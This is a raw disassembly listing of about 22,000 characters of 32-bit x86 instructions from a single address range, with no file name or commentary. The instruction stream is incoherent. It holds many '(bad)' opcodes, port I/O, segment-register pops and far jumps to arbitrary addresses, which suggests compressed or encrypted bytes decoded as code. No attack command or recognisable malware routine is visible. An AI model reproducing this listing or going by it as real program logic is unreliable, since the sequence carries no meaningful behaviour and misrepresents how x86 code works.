  407828:	inc    edx
  407829:	xchg   esp,eax
  40782a:	repz dec ebp
  40782c:	mov    bl,0xed
  40782e:	pop    edi
  40782f:	out    0x34,al
  407831:	mov    ah,0x3c
  407833:	xor    eax,0x8b183d19
  407838:	outs   dx,BYTE PTR ds:[esi]
  407839:	ret    
  40783a:	das    
  40783b:	mov    dh,0x3e
  40783d:	iret   
  40783e:	pop    es
  40783f:	or     DWORD PTR [edx-0x787d042b],ebp
  407845:	mov    edi,0x70ce90fa
  40784a:	add    edx,DWORD PTR [edi+edx*2]
  40784d:	xchg   ecx,eax
  40784e:	mov    WORD PTR [esi-0x4b1b213e],ss
  407854:	addr16 adc eax,0xf8ec1615
  40785a:	in     eax,0x70
  40785c:	sahf   
  40785d:	cmc    
  40785e:	out    0x8b,eax
  407860:	mov    DWORD PTR [edx],esi
  407862:	and    eax,0x1e13adcd
  407867:	out    0x7c,eax
  407869:	fnsave ds:0xc122e802
  40786f:	mov    ch,0x9e
  407871:	shl    BYTE PTR [ecx-0x65d5fdd3],1
  407877:	and    bl,ah
  407879:	adc    dh,al
  40787b:	cmp    ecx,eax
  40787d:	mov    dh,BYTE PTR [edx+0x644d9746]
  407883:	pop    ds
  407884:	or     al,0x1f
  407886:	popf   
  407887:	inc    esi
  407888:	sub    dl,ch
  40788a:	xor    eax,0xc715d295
  40788f:	aas    
  407890:	mov    cl,0xe3
  407892:	or     ebx,esi
  407894:	cmp    BYTE PTR [edi+0x23],cl
  407897:	sti    
  407898:	mov    DWORD PTR [esi],edi
  40789a:	xor    ah,ah
  40789c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40789d:	push   ebx
  40789e:	cmp    BYTE PTR [ecx+ebp*4],0x7c
  4078a2:	jmp    0x99c8321c
  4078a7:	jae    0x40784d
  4078a9:	pop    ecx
  4078aa:	loop   0x40783b
  4078ac:	sbb    edx,edx
  4078ae:	mov    DWORD PTR [edx-0xa],ebp
  4078b1:	(bad)  
  4078b2:	or     al,0x24
  4078b4:	test   BYTE PTR [ebx+0x7d],0x4
  4078b8:	lods   al,BYTE PTR ds:[esi]
  4078b9:	outs   dx,BYTE PTR ds:[esi]
  4078ba:	stos   DWORD PTR es:[edi],eax
  4078bb:	jne    0x407871
  4078bd:	ds jecxz 0x4078f8
  4078c0:	jp     0x4078da
  4078c2:	imul   esp,DWORD PTR [esi-0x68],0xe70ee9fe
  4078c9:	xor    eax,0x31120ed9
  4078ce:	jne    0x40788f
  4078d0:	jae    0x40788d
  4078d2:	mov    WORD PTR [ebx-0x72],fs
  4078d5:	sub    eax,0x2beb5d17
  4078da:	lahf   
  4078db:	(bad)  
  4078dc:	dec    ebx
  4078dd:	sub    BYTE PTR [ecx+0x7a73bdf8],dl
  4078e3:	push   esi
  4078e4:	jmp    0xfa59:0x127fa8aa
  4078eb:	dec    edx
  4078ec:	xchg   esi,eax
  4078ed:	or     ch,BYTE PTR fs:[ecx+0x11]
  4078f1:	lods   al,BYTE PTR ds:[esi]
  4078f2:	clc    
  4078f3:	push   edx
  4078f4:	cmp    DWORD PTR [ebp+0x4bcdc71],0x1b
  4078fb:	xor    DWORD PTR [ebp+0x72],0x2bf67a50
  407902:	rcl    bh,0xc
  407905:	xchg   edi,eax
  407906:	mov    ecx,DWORD PTR [esi+eax*4-0x55]
  40790a:	fsub   DWORD PTR [edx+0x79]
  40790d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40790e:	jb     0x4078bf
  407910:	loopne 0x40789d
  407912:	ret    0x8dee
  407915:	aam    0x1f
  407917:	int    0x59
  407919:	push   0x8f24ebc2
  40791e:	(bad)  
  40791f:	je     0x407947
  407921:	outs   dx,BYTE PTR ds:[esi]
  407922:	mov    al,ds:0x96c47c12
  407927:	and    dl,BYTE PTR [edx+0x31]
  40792a:	inc    eax
  40792b:	shr    eax,cl
  40792d:	lahf   
  40792e:	xor    al,0xa2
  407930:	push   edx
  407931:	jae    0x407915
  407933:	pop    ds
  407934:	retf   
  407935:	pop    ds
  407936:	out    0xf4,eax
  407938:	mov    ecx,0x119ad12
  40793d:	push   esp
  40793e:	pushf  
  40793f:	jnp    0x407903
  407941:	mov    edi,0x5e675533
  407946:	retf   0x3b55
  407949:	inc    edx
  40794a:	sbb    al,0xcb
  40794c:	add    DWORD PTR [edi+0x65],0xe734d0fe
  407953:	pushf  
  407954:	ins    BYTE PTR es:[edi],dx
  407955:	dec    ebp
  407956:	and    DWORD PTR [edx+ecx*4-0x5f],0x49
  40795b:	in     eax,dx
  40795c:	xor    DWORD PTR [esi-0x5695b394],eax
  407962:	into   
  407963:	jno    0x407959
  407965:	cmp    DWORD PTR [ebx+0x7e],esi
  407968:	pop    eax
  40796a:	enter  0x444a,0xa5
  40796e:	scas   eax,DWORD PTR es:[edi]
  40796f:	arpl   di,bx
  407971:	pop    ss
  407972:	in     eax,0x53
  407974:	fidivr WORD PTR [eax]
  407976:	aad    0xcd
  407978:	mov    bl,0x98
  40797a:	inc    eax
  40797b:	ins    DWORD PTR es:[edi],dx
  40797c:	ret    0x81c0
  40797f:	xor    al,al
  407981:	mov    edx,0x574faf72
  407986:	adc    BYTE PTR [ebp-0x1fac7b51],dh
  40798c:	inc    ebp
  40798d:	xor    eax,DWORD PTR [esi]
  40798f:	data16 aam 0x2f
  407992:	xor    eax,edi
  407994:	les    eax,FWORD PTR [eax-0x7f]
  407997:	sub    DWORD PTR [ecx],esi
  407999:	cli    
  40799a:	test   BYTE PTR [ebx],cl
  40799c:	sub    BYTE PTR [ecx+0x5e9802d9],0xf8
  4079a3:	lahf   
  4079a4:	push   ss
  4079a5:	pop    edx
  4079a6:	push   esp
  4079a7:	xlat   BYTE PTR ds:[ebx]
  4079a8:	jnp    0x40795d
  4079aa:	mov    al,ds:0x335dc469
  4079af:	cwde   
  4079b0:	jo     0x40795f
  4079b2:	out    dx,eax
  4079b3:	(bad)  
  4079b4:	bound  edi,QWORD PTR [edx+0xe]
  4079b7:	gs inc ebx
  4079b9:	cmp    edi,DWORD PTR [edi+0x254b0b55]
  4079bf:	xchg   edx,ebx
  4079c1:	xchg   BYTE PTR [eax-0x3f],cl
  4079c4:	cmp    eax,0x6e927294
  4079c9:	loope  0x407a03
  4079cb:	loope  0x407a29
  4079cd:	jg     0x407969
  4079cf:	lock push ss
  4079d1:	adc    DWORD PTR [ebp-0x3923ec81],ebx
  4079d7:	inc    ebx
  4079d8:	mov    esp,0xc1ca7d28
  4079dd:	cmp    al,0x69
  4079df:	aam    0x48
  4079e1:	cwde   
  4079e2:	pop    esi
  4079e3:	daa    
  4079e4:	fwait
  4079e5:	cmc    
  4079e6:	fsub   DWORD PTR [edi-0x49]
  4079e9:	mov    esp,DWORD PTR [esi+0x2c382015]
  4079ef:	or     ch,cl
  4079f1:	lahf   
  4079f2:	or     cl,BYTE PTR [ecx+0x2efb11c5]
  4079f8:	or     DWORD PTR [edx],edx
  4079fa:	cmp    eax,esi
  4079fc:	rcr    DWORD PTR [edx+0x53],cl
  4079ff:	xor    al,0xbe
  407a01:	les    ebx,FWORD PTR [ebx+0x2b]
  407a04:	xor    DWORD PTR [esi+ecx*1-0x430055c5],eax
  407a0b:	xchg   esp,eax
  407a0c:	popa   
  407a0d:	scas   eax,DWORD PTR es:[edi]
  407a0e:	idiv   DWORD PTR [edx]
  407a10:	int3   
  407a11:	pop    es
  407a12:	add    ah,al
  407a14:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407a15:	push   0x1e
  407a17:	cmp    al,0x8a
  407a19:	mov    bh,BYTE PTR [edx+0x7a09796c]
  407a1f:	add    DWORD PTR [edi-0xc3e504b],esi
  407a25:	ss popa 
  407a27:	pop    ecx
  407a28:	and    DWORD PTR [ecx-0x8],eax
  407a2b:	adc    edx,esi
  407a2d:	ins    DWORD PTR es:[edi],dx
  407a2e:	lds    esp,FWORD PTR [ebp+0x57]
  407a31:	cmp    al,0x50
  407a33:	in     al,0x58
  407a35:	ins    DWORD PTR es:[edi],dx
  407a36:	cmp    BYTE PTR [ecx],dl
  407a38:	rcr    BYTE PTR [edx-0x69],cl
  407a3b:	pop    esp
  407a3c:	push   edx
  407a3d:	cmc    
  407a3e:	jmp    0xb6fb6250
  407a43:	in     al,0xb
  407a45:	jns    0x407a52
  407a47:	pop    ecx
  407a48:	inc    edx
  407a49:	inc    ecx
  407a4a:	pusha  
  407a4b:	jae    0x407a70
  407a4d:	scas   al,BYTE PTR es:[edi]
  407a4e:	sub    edx,esp
  407a50:	and    ecx,ebx
  407a52:	push   cs
  407a53:	pop    ecx
  407a54:	lock push edi
  407a56:	push   esi
  407a57:	adc    DWORD PTR [esi],ecx
  407a59:	imul   eax,DWORD PTR [ebx],0x2f
  407a5c:	or     edi,DWORD PTR ds:0x88f162c5
  407a62:	in     al,dx
  407a63:	xor    BYTE PTR [edx-0x53],dl
  407a66:	mov    dl,0xbc
  407a68:	aaa    
  407a69:	cmp    eax,0xe9273f2f
  407a6e:	or     DWORD PTR [esp+ebp*8+0xc0b606b],eax
  407a75:	mul    dh
  407a77:	and    ecx,DWORD PTR [eax+0x3a71ff4f]
  407a7d:	push   ebp
  407a7e:	call   0x5b70:0x5bb057f1
  407a85:	cmp    DWORD PTR [edi+eiz*2+0x5e],0xffffffad
  407a8a:	add    BYTE PTR [edi+0x1a2df523],ah
  407a90:	mov    esp,0x30e82219
  407a95:	(bad)
  407a99:	or     DWORD PTR [ebx],ebp
  407a9b:	pop    es
  407a9c:	jnp    0x407a26
  407a9e:	out    0x59,eax
  407aa0:	es iretw 
  407aa3:	inc    ecx
  407aa4:	mov    ds:0x84d74b21,eax
  407aa9:	xchg   ebx,eax
  407aaa:	xchg   BYTE PTR [esi],dh
  407aac:	push   0x6a8c3083
  407ab1:	imul   ebp,DWORD PTR [eax-0x51cae15b],0xffffffd1
  407ab8:	test   al,0xe2
  407aba:	mov    esp,0x306156f9
  407abf:	mov    ebx,0x467a72f5
  407ac4:	dec    esp
  407ac5:	dec    ecx
  407ac6:	pop    esi
  407ac7:	inc    ecx
  407ac8:	ja     0x407a78
  407aca:	repnz mov esi,0xcb0dfe5f
  407ad0:	xlat   BYTE PTR ds:[ebx]
  407ad1:	adc    bh,BYTE PTR [edx+ebp*1-0x41]
  407ad5:	popf   
  407ad6:	push   0xcf6d1c93
  407adb:	cdq    
  407adc:	nop
  407add:	lock mov bl,0x96
  407ae0:	xor    al,0x2f
  407ae2:	sub    edx,edx
  407ae4:	rol    al,0x73
  407ae7:	int    0x64
  407ae9:	push   edx
  407aea:	push   edi
  407aeb:	test   BYTE PTR [ebx+ebp*2],dl
  407aee:	pushf  
  407aef:	mov    dl,0x21
  407af1:	add    cl,bl
  407af3:	cmp    edi,ebx
  407af5:	int    0x86
  407af7:	enter  0xae22,0xdf
  407afb:	and    dh,BYTE PTR [ebx-0x692c538b]
  407b01:	xor    edx,esp
  407b03:	ss mov ecx,0xa2ef90a2
  407b09:	mov    bl,BYTE PTR cs:[ebx+0x26]
  407b0d:	push   cs
  407b0e:	dec    edx
  407b0f:	jmp    0x2dedf088
  407b14:	in     al,0xee
  407b16:	push   cs
  407b17:	lds    esp,FWORD PTR [ebp-0x22]
  407b1a:	mov    esi,0x28e46e51
  407b1f:	lods   al,BYTE PTR ds:[esi]
  407b20:	xor    DWORD PTR [edx-0x23],edi
  407b23:	jnp    0x407b89
  407b25:	mov    bh,0x72
  407b27:	(bad)  
  407b28:	jo     0x407b00
  407b2a:	cmp    eax,esp
  407b2c:	mov    eax,0x207937c
  407b31:	push   eax
  407b32:	mov    BYTE PTR [edi+0x51b093f5],0x9d
  407b39:	rcr    dh,cl
  407b3b:	adc    ah,BYTE PTR [ebp+ecx*2+0x53]
  407b3f:	push   ecx
  407b40:	in     eax,0xd4
  407b42:	pop    ebx
  407b43:	arpl   WORD PTR [esi+0x7714c4bf],sp
  407b49:	(bad)  
  407b4a:	jmp    0x67a2:0x3869a72
  407b51:	fnstcw WORD PTR [edi]
  407b53:	fidivr WORD PTR [ebx+0x7f6e82ae]
  407b59:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407b5a:	imul   BYTE PTR [esi+0x4316371f]
  407b60:	cmp    bl,BYTE PTR [esi]
  407b62:	aam    0x27
  407b64:	or     dl,dh
  407b66:	mov    esp,0x68c85124
  407b6b:	mov    bh,0x73
  407b6d:	call   0x1690:0x84b76148
  407b74:	mov    ebp,0x66026e35
  407b79:	pop    ss
  407b7a:	cli    
  407b7b:	push   ss
  407b7c:	jbe    0x407b86
  407b7e:	repnz xchg edx,eax
  407b80:	dec    eax
  407b81:	sub    dl,ch
  407b83:	pop    ss
  407b84:	mov    ah,0x1c
  407b86:	pop    edx
  407b87:	pushf  
  407b88:	or     edx,DWORD PTR [esi+0x3df2f775]
  407b8e:	gs push edi
  407b90:	push   ss
  407b91:	cmovbe edi,DWORD PTR [eax-0x6e]
  407b95:	xchg   ecx,eax
  407b96:	loopne 0x407bb0
  407b98:	(bad)  
  407b99:	ror    DWORD PTR [ebx],1
  407b9b:	call   0xf2632752
  407ba0:	cmp    ebp,DWORD PTR [ebp-0x1a]
  407ba3:	pop    esp
  407ba4:	xchg   edi,eax
  407ba5:	mov    ch,0xad
  407ba7:	inc    esi
  407ba8:	dec    edi
  407ba9:	or     dl,BYTE PTR [ebx]
  407bab:	mov    edx,0xdb0c5e69
  407bb0:	pushf  
  407bb1:	xchg   ecx,eax
  407bb2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407bb3:	and    eax,0xf350bc42
  407bb8:	cmc    
  407bb9:	pop    ss
  407bba:	js     0x407bf2
  407bbc:	dec    ebp
  407bbd:	fwait
  407bbe:	dec    ebx
  407bbf:	sbb    BYTE PTR [esi+0x4b4ff9ce],0x41
  407bc6:	pop    ds
  407bc7:	call   0xb7fe:0x85444dc6
  407bce:	push   ss
  407bcf:	jp     0x407bb3
  407bd1:	int    0x4e
  407bd3:	adc    ebp,DWORD PTR [edx-0x585598e8]
  407bd9:	xor    al,0xbc
  407bdb:	push   ds
  407bdc:	xor    eax,0xbacc0e9f
  407be1:	push   ebp
  407be2:	mov    ah,0x3d
  407be4:	cli    
  407be5:	jmp    0x849ad59
  407bea:	inc    edi
  407beb:	fdivr  QWORD PTR [edi+0x72a13872]
  407bf1:	mov    al,0x6a
  407bf3:	pop    esp
  407bf4:	test   DWORD PTR [ebp+esi*1+0x40],0xef4245d2
  407bfc:	retf   
  407bfd:	imul   ebp,DWORD PTR [edx+0x6ecd86a4],0x12
  407c04:	mov    ch,0x6f
  407c06:	jg     0x407ba7
  407c08:	pop    ss
  407c09:	mov    esi,0xe71a5ffa
  407c0e:	sbb    edx,DWORD PTR [esi+0x5c]
  407c11:	push   edx
  407c12:	(bad)  [ebp+0x4bbdeb97]
  407c18:	inc    ebp
  407c19:	and    bl,BYTE PTR [edi+0x15320f89]
  407c1f:	pop    ecx
  407c20:	cmp    eax,esp
  407c22:	pushf  
  407c23:	pop    ebx
  407c24:	sub    BYTE PTR [edi+0x51],0x81
  407c28:	daa    
  407c29:	mov    eax,ds:0x7339c982
  407c2e:	into   
  407c2f:	jg     0x407bf7
  407c31:	pop    ds
  407c32:	les    ebx,FWORD PTR [ebx-0x2f48f9c2]
  407c38:	es fwait
  407c3a:	inc    ebp
  407c3b:	repnz xor DWORD PTR [esi-0x4e4f9ef],ecx
  407c42:	mov    esi,0x6054966c
  407c47:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407c48:	pop    ebp
  407c49:	fnstcw WORD PTR [esi+0x34]
  407c4c:	add    al,0x87
  407c4e:	stos   BYTE PTR es:[edi],al
  407c4f:	mov    esi,0x26dc120e
  407c54:	mov    ebp,0x73395c4c
  407c59:	sub    dl,BYTE PTR [edx]
  407c5b:	leave  
  407c5c:	sub    eax,0xefeb14b4
  407c61:	aas    
  407c62:	sub    esi,DWORD PTR [edi+0x2492358b]
  407c68:	sbb    bl,cl
  407c6a:	cmp    eax,0x34d4cbb2
  407c6f:	or     al,BYTE PTR [ebx-0x1d85f3c8]
  407c75:	cmp    BYTE PTR [ebp+ecx*2-0x6f],dl
  407c79:	(bad)  
  407c7a:	sub    BYTE PTR [edx],dl
  407c7c:	arpl   di,bx
  407c7e:	ror    BYTE PTR [eax-0x72],1
  407c81:	rcl    DWORD PTR [edx],0x4d
  407c84:	inc    ecx
  407c85:	loopne 0x407cd2
  407c87:	inc    esi
  407c88:	into   
  407c89:	in     al,0xf1
  407c8b:	test   al,0xd
  407c8d:	push   edi
  407c8e:	and    esi,ebp
  407c90:	jnp    0x407c21
  407c92:	lods   al,BYTE PTR ds:[esi]
  407c93:	jno    0x407c4e
  407c95:	xchg   esp,eax
  407c96:	dec    edx
  407c97:	out    0xdb,eax
  407c99:	jecxz  0x407c51
  407c9b:	stos   BYTE PTR es:[edi],al
  407c9c:	inc    eax
  407c9d:	daa    
  407c9e:	adc    DWORD PTR [esi],0xffffffbd
  407ca1:	or     ch,ch
  407ca3:	in     al,dx
  407ca4:	mov    esi,0xdea1c8fd
  407ca9:	or     bl,BYTE PTR [ebp+0x5fb28be7]
  407caf:	xchg   edi,eax
  407cb0:	push   ds
  407cb1:	fstp   DWORD PTR [ecx+0x41]
  407cb4:	adc    al,0xba
  407cb6:	push   ebp
  407cb7:	mov    ds:0x93ba2b1f,al
  407cbc:	jl     0x407d38
  407cbe:	bound  esp,QWORD PTR [edi]
  407cc0:	mov    esp,0xac2666b4
  407cc5:	xchg   ebx,eax
  407cc6:	xchg   BYTE PTR [eax],dl
  407cc8:	jbe    0x407cd9
  407cca:	jae    0x407cd3
  407ccc:	stos   DWORD PTR es:[edi],eax
  407ccd:	push   cs
  407cce:	cdq    
  407ccf:	jp     0x4c95a593
  407cd5:	push   esp
  407cd6:	push   eax
  407cd7:	jns    0x407cac
  407cd9:	mov    ?,eax
  407cdb:	es int 0xb6
  407cde:	xor    BYTE PTR [ecx+0x71],bl
  407ce1:	in     al,dx
  407ce2:	js     0x407d39
  407ce4:	sub    esi,eax
  407ce6:	or     al,BYTE PTR [edx]
  407ce8:	mov    ds:0x4b8932e6,eax
  407ced:	sbb    BYTE PTR [ebx-0x4b9eea6c],bh
  407cf3:	dec    edx
  407cf4:	xchg   ecx,eax
  407cf5:	test   al,0x5
  407cf7:	cmp    ecx,ebx
  407cf9:	push   esp
  407cfa:	pop    ss
  407cfb:	jbe    0x407c90
  407cfd:	addr16 iret 
  407cff:	mov    ch,0x46
  407d01:	dec    ebx
  407d02:	xor    esi,DWORD PTR [ebp+0x13]
  407d05:	cli    
  407d06:	cmp    eax,0x1789f6c4
  407d0b:	lods   al,BYTE PTR ds:[esi]
  407d0c:	and    al,0x52
  407d0e:	cmp    esi,DWORD PTR [edx]
  407d10:	into   
  407d11:	mov    eax,ds:0x1742f0a8
  407d16:	pop    ecx
  407d17:	pop    edi
  407d18:	mov    bh,0xab
  407d1a:	push   cs
  407d1b:	cmp    BYTE PTR [edx+0x1cbe9d0d],bl
  407d21:	cmp    BYTE PTR [ebx+edx*1-0x6664b532],bl
  407d28:	ins    DWORD PTR es:[edi],dx
  407d29:	cli    
  407d2a:	sahf   
  407d2b:	jmp    0xad78168a
  407d30:	jle    0x407cd0
  407d32:	outs   dx,BYTE PTR ds:[esi]
  407d33:	ret    0x9d3d
  407d36:	ja     0x407d21
  407d38:	lods   eax,DWORD PTR ds:[esi]
  407d39:	popf   
  407d3a:	out    0xa1,eax
  407d3c:	push   esi
  407d3d:	imul   esp,edi,0xae56f5cb
  407d43:	sub    BYTE PTR [ebx],bh
  407d45:	loopne 0x407d38
  407d47:	sti    
  407d48:	jmp    0x400d:0x7ec7aa6b
  407d4f:	ins    DWORD PTR es:[edi],dx
  407d50:	fwait
  407d51:	adc    al,0x96
  407d53:	ds jmp 0x81d58f4c
  407d59:	test   DWORD PTR [ebx+0x3],edx
  407d5c:	sbb    al,0xfd
  407d5e:	push   cs
  407d5f:	int    0xb2
  407d61:	sub    DWORD PTR [edx-0x5e],ebx
  407d64:	mov    edx,0xa77f8e1f
  407d69:	lahf   
  407d6a:	iret   
  407d6b:	sbb    eax,0x33935f15
  407d70:	push   es
  407d71:	jns    0x407d8e
  407d73:	adc    bl,BYTE PTR [ebp-0xf]
  407d76:	ret    0xb87
  407d79:	dec    edx
  407d7a:	aam    0xd3
  407d7c:	cmp    BYTE PTR [esi],bl
  407d7e:	mov    edx,0x2fbe6c25
  407d83:	pop    ss
  407d84:	ja     0x407de3
  407d86:	scas   al,BYTE PTR es:[edi]
  407d87:	clc    
  407d88:	les    edi,FWORD PTR [ecx+0x12]
  407d8b:	loope  0x407dd4
  407d8d:	and    eax,0x40864b74
  407d92:	clc    
  407d93:	pop    edx
  407d94:	push   0xffffffc2
  407d96:	mov    eax,0xf23dbb67
  407d9b:	adc    eax,DWORD PTR [edx+0x476e25e6]
  407da1:	cwde   
  407da2:	mov    BYTE PTR [edx],ch
  407da4:	sbb    esi,DWORD PTR [ecx+esi*2+0x416e29d1]
  407dab:	mov    ebp,0xfc3dfcb1
  407db0:	scas   al,BYTE PTR es:[edi]
  407db1:	cli    
  407db2:	imul   ebp,DWORD PTR [edx],0x6aca36da
  407db8:	push   edx
  407db9:	dec    ebp
  407dba:	or     dh,cl
  407dbc:	xchg   edx,eax
  407dbd:	cmp    ecx,DWORD PTR [ecx-0x32]
  407dc0:	push   edx
  407dc1:	addr16 xchg esp,eax
  407dc3:	pop    ebp
  407dc4:	cmp    al,0x90
  407dc6:	ret    
  407dc7:	and    al,0x9f
  407dc9:	test   DWORD PTR [ecx+eax*8-0x44312380],ebp
  407dd0:	ins    BYTE PTR es:[edi],dx
  407dd1:	xor    BYTE PTR [edx-0x1c2379d6],cl
  407dd7:	lahf   
  407dd8:	cmp    ch,BYTE PTR [ebp+0x4c]
  407ddb:	pop    edx
  407ddc:	or     DWORD PTR [eax-0x6a],eax
  407ddf:	pushf  
  407de0:	mov    bh,ch
  407de2:	or     BYTE PTR [edi+eax*4+0x461bfd14],bh
  407de9:	add    DWORD PTR [edx],ebx
  407deb:	pop    ds
  407dec:	jns    0x407e26
  407dee:	mov    bh,0xf7
  407df0:	stos   BYTE PTR es:[edi],al
  407df1:	jmp    0xfebb:0x756f38a2
  407df8:	js     0x407dfc
  407dfa:	mov    DWORD PTR [ebp+ebp*4+0x923f308],ebp
  407e01:	icebp  
  407e02:	ret    0x3ed3
  407e05:	fmul   QWORD PTR [ecx+ebx*4+0x400c1ce1]
  407e0c:	retf   
  407e0d:	(bad)  [edi+0x66]
  407e10:	icebp  
  407e11:	test   al,0x53
  407e13:	popf   
  407e14:	cmp    BYTE PTR [eax],0x65
  407e17:	pop    esi
  407e18:	out    dx,eax
  407e19:	daa    
  407e1a:	in     al,dx
  407e1b:	xchg   esi,eax
  407e1c:	mov    bl,0xd7
  407e1e:	mov    ecx,0x492a0e15
  407e23:	push   es
  407e24:	in     al,dx
  407e25:	inc    ecx
  407e26:	adc    BYTE PTR [edx],dl
  407e28:	test   DWORD PTR [ecx+0x2d],0x56178a93
  407e2f:	push   es
  407e30:	push   esp
  407e31:	jg     0x407e38
  407e33:	pop    ecx
  407e34:	add    bl,BYTE PTR [esi+ebx*1+0x748040c0]
  407e3b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407e3c:	mov    al,ds:0x12a9bddc
  407e41:	sbb    al,0x4d
  407e43:	shl    ah,cl
  407e45:	and    eax,0xabccd25a
  407e4a:	data16 mov WORD PTR [ecx],?
  407e4d:	jno    0x407e9d
  407e4f:	popf   
  407e50:	mov    ah,0x3f
  407e52:	lds    eax,FWORD PTR [ebx]
  407e54:	test   BYTE PTR es:[ecx+0x75],dh
  407e58:	call   DWORD PTR [ecx-0x57]
  407e5b:	popa   
  407e5c:	mov    ebx,0x6021ef64
  407e61:	xlat   BYTE PTR ds:[ebx]
  407e62:	push   edx
  407e63:	jge    0x407e1a
  407e65:	sbb    ah,BYTE PTR [eax-0x3b8dc378]
  407e6b:	les    edi,FWORD PTR [ebx+0x56]
  407e6e:	gs popa 
  407e70:	(bad)  
  407e71:	fld    TBYTE PTR [edx]
  407e73:	icebp  
  407e74:	pop    edi
  407e75:	adc    al,BYTE PTR [edx]
  407e77:	fwait
  407e78:	outs   dx,DWORD PTR ds:[esi]
  407e79:	or     DWORD PTR [ebp+0x6e],ecx
  407e7c:	mov    esi,0x345b3405
  407e81:	dec    edx
  407e82:	inc    eax
  407e83:	shl    BYTE PTR [edi+0x4b],cl
  407e86:	rol    ebp,1
  407e88:	shl    DWORD PTR [ebx],0xd7
  407e8b:	sbb    DWORD PTR [ecx+0x1f],esi
  407e8e:	push   0xffffffa4
  407e90:	inc    esp
  407e91:	xor    ah,ah
  407e93:	sbb    eax,0x39bc52d8
  407e98:	sub    BYTE PTR [edx-0x12],ah
  407e9b:	retf   
  407e9c:	mov    WORD PTR [edi],?
  407e9e:	add    al,0xc5
  407ea0:	sub    BYTE PTR [eax],ah
  407ea2:	add    al,0xdd
  407ea4:	mov    esp,0xa38947ca
  407ea9:	push   edi
  407eaa:	push   ds
  407eab:	sbb    BYTE PTR [edx-0xf],al
  407eae:	xor    DWORD PTR [edx+edi*8+0x55],edx
  407eb2:	mov    ebx,0xb91f1690
  407eb7:	out    dx,eax
  407eb8:	adc    al,0x4b
  407eba:	cmc    
  407ebb:	(bad)
  407ebe:	leave  
  407ebf:	sub    bl,0x37
  407ec2:	mov    dh,0x12
  407ec4:	ds in  al,0xf7
  407ec7:	dec    ecx
  407ec8:	sub    al,0x45
  407eca:	retf   
  407ecb:	retf   0xb7a9
  407ece:	jmp    0x407eac
  407ed0:	(bad)  
  407ed1:	cmp    cl,dh
  407ed3:	sbb    eax,0x5256024c
  407ed8:	dec    eax
  407ed9:	adc    BYTE PTR [edi+0x55ecc687],cl
  407edf:	mov    bh,0xd9
  407ee1:	xchg   edx,eax
  407ee2:	pop    es
  407ee3:	mov    ebx,0xe067eefc
  407ee8:	cmc    
  407ee9:	(bad)  
  407eea:	jbe    0x407e7b
  407eec:	out    dx,eax
  407eed:	pop    esi
  407eee:	daa    
  407eef:	sahf   
  407ef0:	jmp    0xc7a4:0x14c2d0a9
  407ef7:	jae    0x407f50
  407ef9:	or     BYTE PTR [edx],al
  407efb:	add    BYTE PTR ds:0xe6a1caed,dl
  407f01:	test   BYTE PTR [ebx-0x42780d6c],bl
  407f07:	sar    DWORD PTR [edi-0x50],cl
  407f0a:	or     dl,BYTE PTR [ecx-0x44]
  407f0d:	inc    eax
  407f0e:	mov    edi,0x43af5870
  407f13:	push   eax
  407f14:	inc    ebx
  407f15:	adc    ebp,ecx
  407f17:	push   ss
  407f18:	xchg   ecx,eax
  407f19:	mov    edi,0x38029f5e
  407f1e:	jmp    0x407f02
  407f20:	adc    al,0xed
  407f22:	mov    dl,0x68
  407f24:	sub    BYTE PTR [esp+edi*8-0x522baa94],dl
  407f2b:	and    BYTE PTR [eax+ecx*8],cl
  407f2e:	pushf  
  407f2f:	pop    esi
  407f30:	fisub  WORD PTR [edi]
  407f32:	imul   edi,ecx,0xfffffff7
  407f35:	dec    ecx
  407f36:	jo     0x407f5f
  407f38:	push   esp
  407f39:	dec    esi
  407f3a:	jecxz  0x407fb2
  407f3c:	jecxz  0x407ed1
  407f3e:	sti    
  407f3f:	push   ss
  407f40:	xor    bl,BYTE PTR [eax]
  407f42:	lods   al,BYTE PTR ds:[esi]
  407f43:	mov    edi,0xe0e61ab4
  407f48:	imul   esp,edx,0xffffff8e
  407f4b:	scas   al,BYTE PTR es:[edi]
  407f4c:	bound  edi,QWORD PTR [ecx+eiz*2]
  407f4f:	sub    bh,BYTE PTR [eax]
  407f51:	xor    al,dl
  407f53:	pop    edi
  407f54:	call   0xad9b:0xb0c5882d
  407f5b:	aam    0xc3
  407f5d:	ins    BYTE PTR es:[edi],dx
  407f5e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407f5f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407f60:	mov    eax,0xcd75ca28
  407f65:	mov    dl,0x52
  407f67:	dec    edi
  407f68:	into   
  407f69:	int3   
  407f6a:	adc    cl,0x6e
  407f6d:	inc    esp
  407f6e:	mov    al,0xea
  407f70:	xchg   edx,eax
  407f71:	inc    edi
  407f72:	push   ebx
  407f73:	in     eax,0x52
  407f75:	and    DWORD PTR [edx+0x63],edi
  407f78:	jns    0x407f42
  407f7a:	stos   DWORD PTR es:[edi],eax
  407f7b:	(bad)  
  407f7c:	and    DWORD PTR [edx],ebp
  407f7e:	scas   al,BYTE PTR es:[edi]
  407f7f:	(bad)  
  407f80:	loope  0x407f5d
  407f82:	xchg   edi,eax
  407f83:	test   DWORD PTR [ecx+0x35],esp
  407f86:	cs js  0x407fd4
  407f89:	in     eax,0x90
  407f8b:	or     ch,ch
  407f8d:	mov    edx,0x5c9e15f2
  407f92:	ficomp WORD PTR [ebx+0xe]
  407f95:	add    bl,BYTE PTR [eax-0x322faa3b]
  407f9b:	loop   0x407f34
  407f9d:	inc    ebx
  407f9e:	jbe    0x407fc3
  407fa0:	sbb    DWORD PTR [ecx],ebx
  407fa2:	pop    edx
  407fa3:	cwde   
  407fa4:	in     eax,0x11
  407fa6:	jo     0x407faa
  407fa8:	pop    edx
  407fa9:	dec    edi
  407faa:	push   eax
  407fab:	cmp    cl,BYTE PTR [esi+esi*2-0x7d]
  407faf:	jb     0x407f73
  407fb1:	pop    es
  407fb2:	push   ecx
  407fb3:	(bad)  
  407fb4:	pop    eax
  407fb5:	adc    al,0x54
  407fb7:	popf   
  407fb8:	clc    
  407fb9:	xchg   ecx,eax
  407fba:	xor    al,0x1b
  407fbc:	dec    esp
